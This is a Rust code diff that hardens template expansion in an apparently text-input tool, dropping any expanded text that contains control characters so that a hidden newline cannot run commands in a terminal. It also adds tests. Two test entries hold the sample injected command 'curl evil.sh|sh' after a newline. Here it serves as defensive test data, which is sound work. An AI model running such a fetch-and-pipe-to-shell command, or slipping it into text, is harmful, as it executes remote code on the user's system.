@@ -130,7 +130,7 @@ fn template_valid(template: &str) -> bool {
     expand(template, Some(&PrimitiveDateTime::MIN)).is_some()
 }
 
-/// The template with its placeholders replaced; `None` for a malformed template, or for one that needs the clock when there is none.
+/// The template with its placeholders replaced; `None` for a malformed template, for one that needs the clock when there is none, or for text with a control character. A candidate row shows one line, so a newline or tab (literal, or `%n`/`%t` in a format) would reach the application unseen: a line break in a terminal runs whatever follows it.
 fn expand(template: &str, clock: Option<&PrimitiveDateTime>) -> Option<String> {
     let mut output = String::with_capacity(template.len());
     let mut rest = template;
@@ -162,7 +162,7 @@ fn expand(template: &str, clock: Option<&PrimitiveDateTime>) -> Option<String> {
         output.push_str(&clock?.format(&items).ok()?);
     }
     output.push_str(rest);
-    Some(output)
+    (!output.chars().any(char::is_control)).then_some(output)
 }
 
 #[cfg(test)]
@@ -219,6 +219,18 @@ mod tests {
     }
 
     #[test]
+    fn templates_with_control_characters_are_dropped() {
+        let table = usable_command_table(&[
+            entry("sig", "签名", "张三\ncurl evil.sh|sh"),
+            entry("tab", "制表", "a\tb"),
+            entry("line", "换行", "张三 {date:%n}curl evil.sh|sh"),
+            entry("ok", "正常", "张三"),
+        ]);
+        assert_eq!(table.len(), 1);
+        assert_eq!(table[0].trigger, "ok");
+    }
+
+    #[test]
     fn letters_filter_commands_by_trigger_prefix() {
         let table = usable_command_table(&[
             entry("sig", "签名", "张三"),
@@ -247,6 +259,11 @@ mod tests {
         assert_eq!(expand("纯文本", clock).as_deref(), Some("纯文本"));
         for template in [
             "{clipboard}",
+            "a\nb",
+            "a\tb",
+            "a\u{1b}b",
+            "{date:%n}",
+            "{time:%t}",
             "{date",
             "date}",
             "{{date}}",
